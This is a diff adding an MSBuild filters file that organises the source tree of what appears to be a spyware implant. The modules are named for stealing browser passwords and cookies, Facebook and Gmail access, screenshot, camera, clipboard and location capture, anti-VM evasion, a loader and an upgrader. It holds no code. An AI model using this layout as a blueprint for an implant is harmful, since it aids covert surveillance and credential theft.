@@ -1,0 +1,378 @@
+﻿<?xml version="1.0" encoding="utf-8"?>
+<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+  <ItemGroup>
+    <Filter Include="Source Files">
+      <UniqueIdentifier>{4FC737F1-C7A5-4376-A066-2A32D752A2FF}</UniqueIdentifier>
+      <Extensions>cpp;c;cc;cxx;def;odl;idl;hpj;bat;asm;asmx</Extensions>
+    </Filter>
+    <Filter Include="Header Files">
+      <UniqueIdentifier>{93995380-89BD-4b04-88EB-625FBE52EBFB}</UniqueIdentifier>
+      <Extensions>h;hpp;hxx;hm;inl;inc;xsd</Extensions>
+    </Filter>
+    <Filter Include="Resource Files">
+      <UniqueIdentifier>{67DA6AB6-F800-4c08-8B7A-83BB121AAD01}</UniqueIdentifier>
+      <Extensions>rc;ico;cur;bmp;dlg;rc2;rct;bin;rgs;gif;jpg;jpeg;jpe;resx;tiff;tif;png;wav;mfcribbon-ms</Extensions>
+    </Filter>
+    <Filter Include="Source Files\mods">
+      <UniqueIdentifier>{e26074d8-0ce3-47a8-8ab9-9c5d1e0f3cb9}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="Source Files\mods\device">
+      <UniqueIdentifier>{5bd05cff-5b1e-4bfe-8f27-d03d54a05a6a}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="Header Files\mods">
+      <UniqueIdentifier>{2528fcec-5b18-418a-858f-6910ed160829}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="Header Files\mods\device">
+      <UniqueIdentifier>{b21f8349-be3a-47b2-b1bc-76a82e7e5d13}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="Header Files\net">
+      <UniqueIdentifier>{7e760071-81c7-416c-8e6f-e3d5cdd663d3}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="Header Files\net\proto">
+      <UniqueIdentifier>{e7d94cb1-e57a-42c6-8565-92cdd3faa7af}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="Header Files\common">
+      <UniqueIdentifier>{b8da54e0-8b81-49e7-b8fb-665702bc5ca7}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="Source Files\common">
+      <UniqueIdentifier>{eed57aec-b71c-4a4c-9d38-7d6464675b78}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="Source Files\crypt">
+      <UniqueIdentifier>{71483620-9389-4643-b3f5-1e8214f49cbb}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="Header Files\mods\screenshot">
+      <UniqueIdentifier>{62ce5c4f-30e7-4745-b0bb-1c68296ab7b8}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="Source Files\mods\screenshot">
+      <UniqueIdentifier>{c6c3d8a3-9552-4dea-9846-5c1dce38ecc8}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="Source Files\loader">
+      <UniqueIdentifier>{60f89190-bb15-4e15-ab1a-4f9f2fd2cc56}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="Header Files\loader">
+      <UniqueIdentifier>{47cb00fd-0489-4391-bb65-30489002f4da}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="Header Files\upgrade">
+      <UniqueIdentifier>{1343e073-8c6e-4af5-b191-0cc7e7300f18}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="Source Files\upgrade">
+      <UniqueIdentifier>{5586fe18-13d2-465c-9189-188c897c6bf8}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="Header Files\mods\social">
+      <UniqueIdentifier>{17288c15-a4d7-493d-b7c9-5534772a82ab}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="Source Files\mods\social">
+      <UniqueIdentifier>{93a3f3ad-a696-409c-a809-c04178e14a6f}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="Header Files\mods\social\twitter">
+      <UniqueIdentifier>{49d08608-5ad8-45c4-9de9-fc49eebf211f}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="Header Files\mods\social\facebook">
+      <UniqueIdentifier>{cc66e1ee-400c-4209-9605-d5202f80a4e6}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="Header Files\mods\social\gmail">
+      <UniqueIdentifier>{96923ca9-0725-411a-954a-ee40a122d3af}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="Source Files\mods\social\facebook">
+      <UniqueIdentifier>{37d1eaf3-98b6-4e74-a92e-c8b9ed7c459e}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="Source Files\mods\social\twitter">
+      <UniqueIdentifier>{aa516747-9505-4d1a-aeb5-09c19cc75bf7}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="Source Files\mods\social\gmail">
+      <UniqueIdentifier>{bd2fd43e-5b77-4a4e-9ece-265823e79528}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="Header Files\loader\crypt">
+      <UniqueIdentifier>{d659444c-35a0-41b9-b854-b55f647a1464}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="Source Files\mods\social\cookies">
+      <UniqueIdentifier>{bd741ec7-407f-4329-8574-7fd5bb02edc5}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="Header Files\mods\social\cookies">
+      <UniqueIdentifier>{0deb574f-b927-49fd-a4b6-f441634565d6}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="Header Files\json">
+      <UniqueIdentifier>{91a760e0-d2b1-4b4e-91da-675456df5b38}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="Source Files\json">
+      <UniqueIdentifier>{e446829a-3663-43c2-819f-3615d0d5c905}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="Source Files\sqlite">
+      <UniqueIdentifier>{301c03cb-9be5-46ad-8e1e-72e7c3a4ddab}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="Header Files\sqlite">
+      <UniqueIdentifier>{e738db56-f821-4dc1-bb9d-5a29753a70f3}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="Header Files\mods\position">
+      <UniqueIdentifier>{94d6b4fe-9d29-4978-b58f-a23bad4ed43a}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="Source Files\mods\position">
+      <UniqueIdentifier>{6f465ce0-d382-426c-802e-895fbf61407c}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="Header Files\mods\clipboard">
+      <UniqueIdentifier>{017406e7-53b3-46f4-8348-aa88dea65fd2}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="Source Files\mods\clipboard">
+      <UniqueIdentifier>{671b000f-d439-4945-a14c-0c6ca129e87d}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="Header Files\mods\password">
+      <UniqueIdentifier>{6dde7aa4-92e3-4539-aaba-4dadfad9164f}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="Source Files\mods\password">
+      <UniqueIdentifier>{6012fa63-6aac-4eb0-9abe-3219fdb63a70}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="Source Files\mods\camera">
+      <UniqueIdentifier>{f2c5246b-c3c2-409a-9c8b-7b229ad1ac8a}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="Header Files\mods\camera">
+      <UniqueIdentifier>{185e718e-e75d-42be-92e9-2b13ea3242bd}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="Source Files\antivm">
+      <UniqueIdentifier>{0693fc6f-c1f6-48f2-9812-2e5d0df8b641}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="Header Files\antivm">
+      <UniqueIdentifier>{e455609f-d7bd-4334-b6b3-6a7754d06fbf}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="Source Files\mods\filesystem">
+      <UniqueIdentifier>{60998d76-e52f-417d-a946-03b4f2ed2e62}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="Header Files\mods\filesystem">
+      <UniqueIdentifier>{86092a61-b653-4c75-889b-69b1b2fd1635}</UniqueIdentifier>
+    </Filter>
+  </ItemGroup>
+  <ItemGroup>
+    <ClCompile Include="main.cpp">
+      <Filter>Source Files</Filter>
+    </ClCompile>
+    <ClCompile Include="export.cpp">
+      <Filter>Source Files</Filter>
+    </ClCompile>
+    <ClCompile Include="sync_thread.cpp">
+      <Filter>Source Files</Filter>
+    </ClCompile>
+    <ClCompile Include="device.cpp">
+      <Filter>Source Files\mods\device</Filter>
+    </ClCompile>
+    <ClCompile Include="debug.cpp">
+      <Filter>Source Files\common</Filter>
+    </ClCompile>
+    <ClCompile Include="mayhem.cpp">
+      <Filter>Source Files\common</Filter>
+    </ClCompile>
+    <ClCompile Include="utils.cpp">
+      <Filter>Source Files\common</Filter>
+    </ClCompile>
+    <ClCompile Include="winhttp.cpp">
+      <Filter>Source Files\common</Filter>
+    </ClCompile>
+    <ClCompile Include="zmem.cpp">
+      <Filter>Source Files\common</Filter>
+    </ClCompile>
+    <ClCompile Include="md5.cpp">
+      <Filter>Source Files\crypt</Filter>
+    </ClCompile>
+    <ClCompile Include="aes.cpp">
+      <Filter>Source Files\crypt</Filter>
+    </ClCompile>
+    <ClCompile Include="sha1.cpp">
+      <Filter>Source Files\crypt</Filter>
+    </ClCompile>
+    <ClCompile Include="crypt.cpp">
+      <Filter>Source Files\crypt</Filter>
+    </ClCompile>
+    <ClCompile Include="base64.cpp">
+      <Filter>Source Files\crypt</Filter>
+    </ClCompile>
+    <ClCompile Include="screenshot.cpp">
+      <Filter>Source Files\mods\screenshot</Filter>
+    </ClCompile>
+    <ClCompile Include="loader.cpp">
+      <Filter>Source Files\loader</Filter>
+    </ClCompile>
+    <ClCompile Include="upgrade.cpp">
+      <Filter>Source Files\upgrade</Filter>
+    </ClCompile>
+    <ClCompile Include="cookies.cpp">
+      <Filter>Source Files\mods\social\cookies</Filter>
+    </ClCompile>
+    <ClCompile Include="firefox_cookies.cpp">
+      <Filter>Source Files\mods\social\cookies</Filter>
+    </ClCompile>
+    <ClCompile Include="chrome_cookies.cpp">
+      <Filter>Source Files\mods\social\cookies</Filter>
+    </ClCompile>
+    <ClCompile Include="ie_cookies.cpp">
+      <Filter>Source Files\mods\social\cookies</Filter>
+    </ClCompile>
+    <ClCompile Include="social.cpp">
+      <Filter>Source Files\mods\social</Filter>
+    </ClCompile>
+    <ClCompile Include="facebook.cpp">
+      <Filter>Source Files\mods\social\facebook</Filter>
+    </ClCompile>
+    <ClCompile Include="JSON.cpp">
+      <Filter>Source Files\json</Filter>
+    </ClCompile>
+    <ClCompile Include="JSONValue.cpp">
+      <Filter>Source Files\json</Filter>
+    </ClCompile>
+    <ClCompile Include="sqlite.c">
+      <Filter>Source Files\sqlite</Filter>
+    </ClCompile>
+    <ClCompile Include="position.cpp">
+      <Filter>Source Files\mods\position</Filter>
+    </ClCompile>
+    <ClCompile Include="clipboard.cpp">
+      <Filter>Source Files\mods\clipboard</Filter>
+    </ClCompile>
+    <ClCompile Include="password.cpp">
+      <Filter>Source Files\mods\password</Filter>
+    </ClCompile>
+    <ClCompile Include="ie_password.cpp">
+      <Filter>Source Files\mods\password</Filter>
+    </ClCompile>
+    <ClCompile Include="ffox_password.cpp">
+      <Filter>Source Files\mods\password</Filter>
+    </ClCompile>
+    <ClCompile Include="chrome_password.cpp">
+      <Filter>Source Files\mods\password</Filter>
+    </ClCompile>
+    <ClCompile Include="proto.cpp">
+      <Filter>Source Files</Filter>
+    </ClCompile>
+    <ClCompile Include="gmail.cpp">
+      <Filter>Source Files\mods\social\gmail</Filter>
+    </ClCompile>
+    <ClCompile Include="conf.cpp">
+      <Filter>Source Files</Filter>
+    </ClCompile>
+    <ClCompile Include="camera.cpp">
+      <Filter>Source Files\mods\camera</Filter>
+    </ClCompile>
+    <ClCompile Include="antivm.cpp">
+      <Filter>Source Files\antivm</Filter>
+    </ClCompile>
+    <ClCompile Include="filesystem.cpp">
+      <Filter>Source Files\mods\filesystem</Filter>
+    </ClCompile>
+    <ClCompile Include="download.cpp">
+      <Filter>Source Files\mods\filesystem</Filter>
+    </ClCompile>
+  </ItemGroup>
+  <ItemGroup>
+    <ClInclude Include="main.h">
+      <Filter>Header Files</Filter>
+    </ClInclude>
+    <ClInclude Include="device.h">
+      <Filter>Header Files\mods\device</Filter>
+    </ClInclude>
+    <ClInclude Include="winhttp.h">
+      <Filter>Header Files\net</Filter>
+    </ClInclude>
+    <ClInclude Include="binpatch.h">
+      <Filter>Header Files\common</Filter>
+    </ClInclude>
+    <ClInclude Include="debug.h">
+      <Filter>Header Files\common</Filter>
+    </ClInclude>
+    <ClInclude Include="globals.h">
+      <Filter>Header Files\common</Filter>
+    </ClInclude>
+    <ClInclude Include="mayhem.h">
+      <Filter>Header Files\common</Filter>
+    </ClInclude>
+    <ClInclude Include="utils.h">
+      <Filter>Header Files\common</Filter>
+    </ClInclude>
+    <ClInclude Include="zmem.h">
+      <Filter>Header Files\common</Filter>
+    </ClInclude>
+    <ClInclude Include="proto.h">
+      <Filter>Header Files\net\proto</Filter>
+    </ClInclude>
+    <ClInclude Include="aes.h">
+      <Filter>Header Files\loader\crypt</Filter>
+    </ClInclude>
+    <ClInclude Include="sha1.h">
+      <Filter>Header Files\loader\crypt</Filter>
+    </ClInclude>
+    <ClInclude Include="md5.h">
+      <Filter>Header Files\loader\crypt</Filter>
+    </ClInclude>
+    <ClInclude Include="crypt.h">
+      <Filter>Header Files\loader\crypt</Filter>
+    </ClInclude>
+    <ClInclude Include="base64.h">
+      <Filter>Header Files\loader\crypt</Filter>
+    </ClInclude>
+    <ClInclude Include="screenshot.h">
+      <Filter>Header Files\mods\screenshot</Filter>
+    </ClInclude>
+    <ClInclude Include="loader.h">
+      <Filter>Header Files\loader</Filter>
+    </ClInclude>
+    <ClInclude Include="upgrade.h">
+      <Filter>Header Files\upgrade</Filter>
+    </ClInclude>
+    <ClInclude Include="cookies.h">
+      <Filter>Header Files\mods\social\cookies</Filter>
+    </ClInclude>
+    <ClInclude Include="firefox_cookies.h">
+      <Filter>Header Files\mods\social\cookies</Filter>
+    </ClInclude>
+    <ClInclude Include="chrome_cookies.h">
+      <Filter>Header Files\mods\social\cookies</Filter>
+    </ClInclude>
+    <ClInclude Include="ie_cookies.h">
+      <Filter>Header Files\mods\social\cookies</Filter>
+    </ClInclude>
+    <ClInclude Include="social.h">
+      <Filter>Header Files\mods\social</Filter>
+    </ClInclude>
+    <ClInclude Include="facebook.h">
+      <Filter>Header Files\mods\social\facebook</Filter>
+    </ClInclude>
+    <ClInclude Include="JSON.h">
+      <Filter>Header Files\json</Filter>
+    </ClInclude>
+    <ClInclude Include="JSONValue.h">
+      <Filter>Header Files\json</Filter>
+    </ClInclude>
+    <ClInclude Include="sqlite.h">
+      <Filter>Header Files\sqlite</Filter>
+    </ClInclude>
+    <ClInclude Include="position.h">
+      <Filter>Header Files\mods\position</Filter>
+    </ClInclude>
+    <ClInclude Include="clipboard.h">
+      <Filter>Header Files\mods\clipboard</Filter>
+    </ClInclude>
+    <ClInclude Include="password.h">
+      <Filter>Header Files\mods\password</Filter>
+    </ClInclude>
+    <ClInclude Include="ie_password.h">
+      <Filter>Header Files\mods\password</Filter>
+    </ClInclude>
+    <ClInclude Include="ffox_password.h">
+      <Filter>Header Files\mods\password</Filter>
+    </ClInclude>
+    <ClInclude Include="chrome_password.h">
+      <Filter>Header Files\mods\password</Filter>
+    </ClInclude>
+    <ClInclude Include="gmail.h">
+      <Filter>Header Files\mods\social\gmail</Filter>
+    </ClInclude>
+    <ClInclude Include="conf.h">
+      <Filter>Header Files</Filter>
+    </ClInclude>
+    <ClInclude Include="camera.h">
+      <Filter>Header Files\mods\camera</Filter>
+    </ClInclude>
+    <ClInclude Include="antivm.h">
+      <Filter>Header Files\antivm</Filter>
+    </ClInclude>
+    <ClInclude Include="filesystem.h">
+      <Filter>Header Files\mods\filesystem</Filter>
+    </ClInclude>
+  </ItemGroup>
+</Project>
